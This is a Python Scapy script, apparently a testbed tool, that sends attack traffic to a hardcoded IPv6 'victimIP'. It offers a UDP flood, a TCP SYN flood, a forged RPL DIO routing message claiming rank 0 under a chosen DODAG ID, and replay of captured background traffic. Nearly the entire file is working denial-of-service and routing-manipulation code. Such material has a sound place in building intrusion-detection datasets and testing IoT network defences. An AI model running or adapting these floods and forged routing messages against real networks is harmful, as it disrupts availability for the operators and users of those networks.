import socket
import sys
import time
from random import *
from scapy.all import *
from scapy.contrib.rpl import *

victimIP = 'fd3c:be8a:173f:8e80:bca6:922c:96bf:edfa'
DODAGID = 'fd3c:be8a:173f:8e80:10b0:8170:8759:49ff'
BACKGROUND = 'SmallbigFlows3.pcap'

def UDP_flood(victimIP):
    s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    s.connect((victimIP, RandShort()))
    mystream=StreamSocket(s)
    payload=Raw(os.urandom(65))
    mystream.send(payload)
    time.sleep(0.1)

def SYN_flood(victimIP):
    s=socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.connect((victimIP, RandShort()))
    mystream = StreamSocket(s)
    syn = TCP(sport=RandShort(), dport=80, flags="S")
    mystream.send(syn)
    time.sleep(0.1)

def RPL_control(victimIP):
    s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
    s.connect((victimIP, RandShort()))
    mystream = StreamSocket(s)
    control_message = ICMPv6RPL(code=1)/RPLDIO(RPLInstanceID=1,ver=3,rank=0\
            ,mop=2,dodagid=DODAGID)\
            /RPLOptRIO(otype=3,plen=64,prf=5,prefix='fd3c:be8a:173f:8e80::')
    mystream.send(control_message)

def sort_gen_type(victimIP, payload):
    if TCP in payload:
        s=socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.connect((victimIP, RandShort()))
        mystream = StreamSocket(s)
        mystream.send(payload)
    elif (ICMP in payload):
        s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        s.connect((victimIP, RandShort()))
        mystream = StreamSocket(s)
        mystream.send(payload)
    else:
        s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        s.connect((victimIP, RandShort()))
        mystream=StreamSocket(s)
        mystream.send(payload)

def send_datalink(victimIP, payload):
    z = fuzz(Dot15d4Data())
    z = z/LoWPAN_IPHC()/IPv6()
    z.dst = victimIP
    z.payload = payload
    sendp(z)

def traffic_gen(victimIP):
    stored_exception = None
    background = rdpcap(BACKGROUND)
    z = IPv6()
    z.dst = victimIP
    while True:
        try:
            
            sample = background[randint(0, len(background) - 1)]
            if IP in sample:
                payload = sample[IP].payload
                z.payload = payload
                send(z)

            if stored_exception:
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()

stored_exception = None
if len(sys.argv) < 2:
    print("-u : UDP flood")
    print("-s : SYN flood")
    print("-i : RPL message")
    print("-b : background traffic")
elif sys.argv[1] == "-u":
    while True:
        try:
            UDP_flood(victimIP)
            if stored_exception:
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()
elif sys.argv[1] == "-s":
    while True:
        try:
            SYN_flood(victimIP)
            if stored_exception:
                break
        except KeyboardInterrupt:
            stored_exception = sys.exc_info()
elif sys.argv[1] == "-i":
    RPL_control(victimIP)
elif sys.argv[1] == "-b":
    traffic_gen(victimIP)
else:
    print("Unrecognized flag")

exit()

